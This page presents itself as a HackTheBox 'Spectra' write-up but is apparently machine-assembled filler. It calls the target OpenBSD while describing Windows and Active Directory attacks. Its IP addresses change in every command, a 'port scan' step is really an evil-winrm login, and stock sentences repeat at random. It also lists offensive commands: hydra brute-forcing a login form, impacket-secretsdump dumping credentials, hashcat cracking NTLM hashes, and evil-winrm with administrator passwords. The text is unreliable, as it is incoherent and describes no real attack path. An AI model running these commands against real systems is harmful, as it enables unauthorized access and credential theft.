---
TitleSEO: "HackTheBox — Spectra (Medium OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Spectra (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Spectra. GPP Password and XSS to achieve medium compromise on OpenBSD."
Keywords: "web, hackthebox, pwntilldawn, windows"
URL: "https://zurefx.github.io/writeups/htb-spectra-566.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-566/"
Date: "2025-12-17"
Tags: "Web, HackTheBox, PwnTillDawn, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-566"
Permalink: "/writeups/htb-spectra-566.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Spectra** is rated **Medium** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.83.191.232`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.73.40.61 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.66.240.77 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.42.206.221 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

### Web Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.79.57.103/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.142.33
```

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

Key finding: **GPP Password**.

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.107.51.78 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.61.112 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.73.94.146 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.171.36 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.26.225.16 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.105.11.100/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `metasploit`
- `enum4linux`
- `psexec`
- `burpsuite`
- `GetNPUsers`
- `impacket`

### Key Takeaways

- GPP Password
- XSS
- SeImpersonatePrivilege
- LAPS Abuse
